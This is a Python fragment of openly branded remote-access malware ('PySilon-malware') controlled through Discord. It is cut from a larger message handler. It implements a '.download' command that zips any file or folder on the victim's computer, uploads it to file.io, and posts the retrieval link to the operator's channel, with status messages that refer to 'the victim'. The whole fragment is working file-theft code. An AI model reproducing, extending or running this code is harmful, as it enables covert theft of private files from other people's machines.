from shutil import copy2, rmtree
from zipfile import ZipFile
import os
import requests
import asyncio

elif message.content.startswith('.download'):
    await message.delete()
    if message.channel.id != channel_ids['file']:
        embed = discord.Embed(title="📛 Error", description=f'_ _\n❗`This command works only on file-related channel:` <#{channel_ids["file"]}>❗\n||-||', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        file_path = message.content[10:].strip().strip('"').strip("'")
        if not file_path:
            embed = discord.Embed(title="📛 Error", description='```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            reaction_msg = await message.channel.send(embed=embed)
            await reaction_msg.add_reaction('🔴')
        else:
            target_path = os.path.join(*working_directory, file_path)
            if not os.path.exists(target_path):
                embed = discord.Embed(title="📛 Error", description='```❗ File or directory not found.```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                reaction_msg = await message.channel.send(embed=embed)
                await reaction_msg.add_reaction('🔴')
            else:
                is_zipped = False
                upload_file = target_path

                if os.path.isdir(target_path):
                    zip_path = target_path + '.zip'
                    with ZipFile(zip_path, 'w') as zip_file:
                        for root, _, files in os.walk(target_path):
                            for file in files:
                                full_path = os.path.join(root, file)
                                relative_path = os.path.relpath(full_path, os.path.dirname(target_path))
                                zip_file.write(full_path, relative_path)
                    upload_file = zip_path
                    is_zipped = True

                await message.channel.send("```Uploading to file.io... This can take a while depending on the file size, amount and the victim's internet speed..```")

                def upload_to_fileio(path_to_upload):
                    with open(path_to_upload, 'rb') as f:
                        response = requests.post('https://file.io/', files={'file': f})
                    return response.json()

                loop = asyncio.get_event_loop()
                data = await loop.run_in_executor(None, upload_to_fileio, upload_file)

                if is_zipped and os.path.exists(upload_file):
                    os.remove(upload_file)

                if data.get('success'):
                    embed = discord.Embed(title=f"🟢 {file_path}", description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                    await message.channel.send('Warning: The file will be removed from file.io right after the first download.')
                else:
                    embed = discord.Embed(title="📛 Error", description='```Upload to file.io failed.```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed)
                    await reaction_msg.add_reaction('🔴')
